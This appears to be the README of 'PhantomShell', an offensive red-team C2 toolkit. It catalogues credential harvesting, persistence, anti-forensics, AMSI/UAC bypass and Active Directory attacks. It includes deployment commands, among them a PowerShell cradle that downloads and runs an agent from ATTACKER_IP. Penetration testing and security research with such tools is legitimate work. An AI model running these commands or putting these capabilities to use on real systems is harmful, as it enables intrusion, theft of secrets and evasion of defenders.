# PhantomShell 🔮

[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python)](https://python.org)
[![.NET 8](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet)](https://dotnet.microsoft.com)
[![PowerShell 5.1+](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE?logo=powershell)](https://docs.microsoft.com/powershell)
[![PHP 5.6+](https://img.shields.io/badge/PHP-5.6%2B-777BB4?logo=php)](https://php.net)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-5.2-blue.svg)]()
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey)]()

**Multi-Language Red Team Toolkit** — Python, C#, PowerShell, and PHP agents with encrypted C2, Active Directory attacks, and automated post-exploitation.

> ⚠️ **For authorized penetration testing, CTF competitions, and security research only.**

---

## Features

| Category | Commands | Description |
|----------|----------|-------------|
| **Core Shell** | `help`, `cd`, `pwd`, `clear`, `history`, `pty`, `alias` | Interactive shell with arrow keys, tab completion, history |
| **File Ops** | `cat`, `head`, `tail`, `ls`, `upload`, `download`, `edit` | Full file management with base64 transfer |
| **Recon** | `sysinfo`, `env`, `services`, `ports`, `firewall`, `netmap` | Deep system reconnaissance |
| **Vuln Scanner** | `vuln_scan` | Kernel CVEs, SUID/GTFOBins, sudo, docker, polkit, caps |
| **Exploits** | `exploit_suggest`, `exploit_fetch`, `exploit_compile` | Auto-suggest + fetch + compile kernel exploits |
| **Privesc** | `privesc_check`, `privesc_auto`, `privesc_suggest` | Automated privilege escalation checks |
| **Pivoting** | `pivot_portfwd`, `pivot_socks`, `pivot_tunnel`, + 6 more | TCP forwarding, SOCKS4 proxy, tool guides |
| **Network** | `portscan`, `connect`, `listen`, `bannergrab` | Port scanning, raw TCP, banner grabbing |
| **Persistence** | `persist_all`, `persist_cron`, `persist_ssh`, + 7 more | 10 persistence methods (cron, systemd, SSH, rc, motd...) |
| **Evasion** | `clean_logs`, `clean_self`, `hide_process`, `timestomp` | Anti-forensics and log cleaning |
| **Lateral** | `lateral_ssh`, `lateral_scp`, `lateral_wmi`, `lateral_smb` | Move between machines |
| **Stealing** | `steal_all`, `steal_configs`, `steal_ssh`, + 4 more | Credential and secret harvesting |
| **Backdoors** | `backdoor_php`, `backdoor_python`, `backdoor_bash`, + 3 more | Deploy persistent access |
| **C2** | `c2_discord`, `c2_telegram`, `c2_http`, `c2_sliver`, + 3 more | Command & control integration |
| **Exfil** | `exfil`, `compress` | Data exfiltration with gzip+base64 |
| **Automation** | `auto_root`, `auto_pivot`, `auto_persist`, `auto_clean`, `auto_report` | One-command operations |
| **Jobs** | `background`, `fg`, `jobs`, `kill` | Background process management |

## 3 Adaptive Modes

```
┌──────────────────────────────────────────────────┐
│  Server Capabilities Auto-Detection              │
│                                                  │
│  ┌─ Memory > 32MB ─┐                            │
│  ├─ Exec available  ├─► FULL MODE (100+ cmds)   │
│  ├─ Disk writable   │                            │
│  └─ No restrictions ┘                            │
│                                                  │
│  ┌─ Limited memory ─┐                            │
│  ├─ Exec available  ├─► NORMAL MODE (basic)      │
│  └─ Some limits     ┘                            │
│                                                  │
│  ┌─ No exec methods ┐                            │
│  └─ Restricted env  ┘─► MINIMAL MODE (stager)    │
└──────────────────────────────────────────────────┘
```

- **FULL**: All 100+ commands, pivoting suite, C2 integration
- **NORMAL**: Basic shell, file ops, recon, port scanning
- **MINIMAL**: Loader/stager, module fetching, PHP eval, self-upgrade

## Quick Start

### 1. Start C2 Server
```bash
cd PhantomShell/c2/server
python3 app.py
# [+] PhantomShell C2 v5.2
# phantom> listen tcp 0.0.0.0 4444
# phantom> listen http 0.0.0.0 8443
```

### 2. Deploy Agent (pick your language)

**Python (Linux/Windows)**
```bash
python3 agents/python/agent.py --host ATTACKER_IP --port 4444
```

**C# (Windows)**
```bash
dotnet run --project agents/csharp/ -- --host ATTACKER_IP --port 4444
# Or publish single-file: dotnet publish -c Release -r win-x64 --self-contained
```

**PowerShell (Windows — in-memory)**
```powershell
IEX(IWR http://ATTACKER_IP:8080/Agent.ps1 -UseBasicParsing)
Start-Agent -C2Host ATTACKER_IP -C2Port 4444
```

**PHP (Linux)**
```bash
php agents/php/phantom.php   # Full mode (100+ commands)
php agents/php/loader.php    # Minimal stager
```

### 3. Interact
```
phantom> sessions
phantom> interact 1
[tcp:aes] [python] [www-data@web01:/var/www]$ sysinfo
[tcp:aes] [python] [www-data@web01:/var/www]$ ad_enum
[tcp:aes] [python] [www-data@web01:/var/www]$ privesc_check
```

## Installation

```bash
git clone https://github.com/OmonovSarvar/PhantomShell.git
cd PhantomShell

# Python agent dependencies
pip install -r agents/python/requirements.txt

# C# agent (requires .NET 8 SDK)
dotnet build agents/csharp/

# PowerShell — no installation needed, runs in-memory
```

## Architecture

```
PhantomShell/
├── proto/                       # Shared protocol & command registry
│   ├── messages.json            # JSON wire protocol schema
│   └── commands.json            # 100+ commands (help, completion, validation)
├── agents/
│   ├── python/                  # Python agent (Linux/Windows)
│   │   ├── agent.py             # Entry point + main loop
│   │   ├── transport/           # TCP, HTTP(S) transports
│   │   ├── crypto/              # AES-256-GCM + ECDH X25519
│   │   ├── core/                # Dispatcher, executor, scheduler, loader
│   │   └── modules/             # recon, privesc (220+ GTFOBins), stealing,
│   │                            # persist, lateral, evasion, pivoting, ad
│   ├── csharp/                  # C# Windows agent (.NET 8)
│   │   ├── PhantomAgent.csproj  # Single-file publish, self-contained
│   │   ├── Program.cs           # Entry point
│   │   ├── Transport/           # TCP, HTTP(S)
│   │   ├── Crypto/              # AES-256-GCM
│   │   ├── Core/                # Dispatcher, executor, scheduler
│   │   └── Modules/             # Recon, TokenManip, CredDump, UacBypass,
│   │                            # AmsiBypass, EtwBypass, Registry, Services, AD
│   ├── powershell/              # PowerShell agent (in-memory)
│   │   ├── Agent.ps1            # Cradle + main loop
│   │   └── Modules/             # AD, CredDump, Lateral, Persist, Evasion
│   └── php/                     # PHP agent (dual-mode: JSON + plaintext)
│       ├── phantom.php          # FULL mode (100+ commands, auto-adaptive)
│       ├── normal.php           # NORMAL mode
│       ├── loader.php           # MINIMAL mode (stager)
│       └── modules/             # 9 loadable modules
├── c2/
│   └── server/                  # C2 server (TCP + HTTP listeners, sessions, CLI)
├── playbooks/                   # YAML automation workflows
├── docs/                        # Documentation
├── tests/                       # Integration tests
└── Makefile
```

## Active Directory Attacks

| Technique | Python | C# | PowerShell |
|-----------|--------|-----|------------|
| Domain Enumeration | ✅ | ✅ | ✅ |
| Kerberoasting | ✅ | ✅ | ✅ |
| AS-REP Roasting | ✅ | — | ✅ |
| ACL/DACL Abuse | ✅ | ✅ | ✅ |
| RBCD Abuse | ✅ | ✅ | ✅ |
| ADCS ESC1-ESC8 | ✅ | ✅ | ✅ |
| LAPS Retrieval | ✅ | ✅ | ✅ |
| Shadow Credentials | ✅ | ✅ | ✅ |
| Golden/Silver Tickets | — | ✅ | — |
| gMSA Extraction | ✅ | ✅ | ✅ |
| Token Manipulation | — | ✅ | — |
| UAC Bypass (4 methods) | — | ✅ | — |
| AMSI/ETW Bypass | — | ✅ | ✅ |
| Credential Dumping | ✅ | ✅ | ✅ |

## Windows Post-Exploitation (C# Agent)

| Module | Techniques |
|--------|------------|
| **TokenManip** | Steal token, make token, impersonate, rev2self |
| **CredDump** | SAM dump, DPAPI decrypt, Credential Manager, Windows Vault |
| **UacBypass** | FodHelper, CMSTP, ComputerDefaults, EventViewer |
| **AmsiBypass** | Patch AmsiScanBuffer in memory |
| **EtwBypass** | Patch EtwEventWrite in ntdll |
| **Registry** | Read/write/delete keys, persistence locations |
| **Services** | Create/start/stop/delete Windows services |

## Encryption & Transport

| Layer | Technology |
|-------|-----------|
| **Key Exchange** | ECDH X25519 + HKDF-SHA256 |
| **Encryption** | AES-256-GCM (96-bit nonce, 128-bit tag) |
| **Authentication** | HMAC-SHA256 (pre-shared key) |
| **Wire Protocol** | 4-byte length-prefix + JSON |
| **TCP Transport** | Direct socket, retry/reconnect |
| **HTTP Transport** | User-Agent rotation, URL jitter, TLS, proxy support |

## PHP Execution Bypass

PhantomShell PHP agent uses 8 methods to bypass `disable_functions`:

1. `proc_open` — Full duplex with stdin/stdout/stderr
2. `popen` — Unidirectional pipe
3. `exec` — Array output
4. `shell_exec` — String output
5. `system` — Direct output
6. `passthru` — Binary-safe output
7. `FFI` — PHP 7.4+ Foreign Function Interface
8. `mail() + putenv()` — LD_PRELOAD injection

## Legal Disclaimer

This tool is provided for **authorized security testing** and **educational purposes only**. You must have explicit written permission before using this tool against any system you do not own. Unauthorized access to computer systems is illegal.

The author assumes no liability for misuse of this software.

## License

[MIT License](LICENSE)

## Author

**OmonovSarvar** — Penetration Tester

---

*Built for security professionals, by security professionals.*
